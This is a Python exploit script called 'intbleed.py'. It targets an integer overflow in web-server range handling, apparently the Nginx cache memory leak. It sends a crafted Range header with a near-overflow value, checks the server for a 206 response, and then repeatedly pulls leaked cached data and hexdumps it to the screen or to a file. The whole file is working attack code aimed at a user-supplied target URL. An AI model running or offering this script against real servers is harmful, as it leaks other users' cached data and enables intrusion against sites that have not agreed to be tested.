# Binary exploitation for integer overflow. Check if the server
# is vulnerable to integer overflow and then dump data from it 
# (cached files).
# 
#
# Author: Pham Sy Minh (@shelld3v)
# Email: <phamminh0227@gmail.com>
# Github: https://github.com/shelld3v

from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
import argparse
import urllib


requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Exploit(requests.Session):
    buffer = set()
    def __init__(self, url):
        length = int(requests.get(url).headers.get("Content-Length", 0)) + 623
        super().__init__()
        self.headers = {"Range": f"bytes=-{length},-9223372036854{776000 - length}"}
        self.target = urllib.parse.urlsplit(url)
    
    def check(self):
        try:
            response = self.get(self.target.geturl())
            if response.status_code == 206 and "Content-Range" in response.text:
                print('Warning: Integer overflow vulnerability detected')
                return 1
            elif response.status_code == 416:
                print('Warning: Target does not vulnerable to integer overflow')
            else:
                print('Warning: Target does not support range requests')
        except Exception as e:
            print(e)
            return False
    
    def hexdump(self, data):
        for b in range(0, len(data), 16):
            line = [char for char in data[b: b + 16]]
            if not len(file):
                print("{:04x}: {:48} {}".format(b, " ".join(f"{char:02x}" for char in line), "".join((chr(char) if 32 <= char <= 126 else ".") for char in line)))
            else:
                writefile.write("{:04x}: {:48} {}".format(b, " ".join(f"{char:02x}" for char in line), "".join((chr(char) if 32 <= char <= 126 else ".") for char in line))+'\n')
    
    def execute(self):
        if not len(file):
            dumpout = input('Do you want to dump all data (Y/n) ')
            if dumpout in ['n', 'N']:
                end()
            
        data = b''
        while len(self.buffer) < 0x80:
            try:
                response = self.get(self.target.geturl())
                for line in response.content.split(b"\r\n"):
                    if line not in self.buffer:
                        data += line
                        self.buffer.add(line)
            except Exception as e:
                print()
                print(f"{type(e).__name__}:")
                print(f"{e}", "red", True)
                break
            except KeyboardInterrupt:
                print()
                print("Keyboard Interrupted")
                break
            print(f"Receiving data {len(data)} bytes ...", end = "\r")
        print('                                                                                       ', end = "\r")
        if data:
            print()
            self.hexdump(data)

def end():
    print()
    print('Session finished')
    print()
    quit()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog = "intbleed.py",
                                     description = "Intbleed version 0.2, checker and exploitaion for Integer overflow vulnerablity",
                                     )
    parser.add_argument('-u', type=str, help='Target URL', dest='url')
    parser.add_argument('-f', type=str, help='File to dump', dest='file', default='')
    
    args = parser.parse_args()
    
    try:
        file = format(args.file)
        try:
            writefile = open(file, 'w+')
            print('Created file %s' % file)
        except:
            pass
        exploit = Exploit(format(args.url))
        print('Setup the buffer')
        if exploit.check():
            try:
                exploit.execute()
            except Exception as e:
                print(f"{type(e).__name__}:")
                print(f"{e}", True)
        else:
            end()
            
    except KeyboardInterrupt:
        print('Keyboard Interrupted')
        quit()
        
    except Exception as e:
        print('Error: %s' % e)

end()
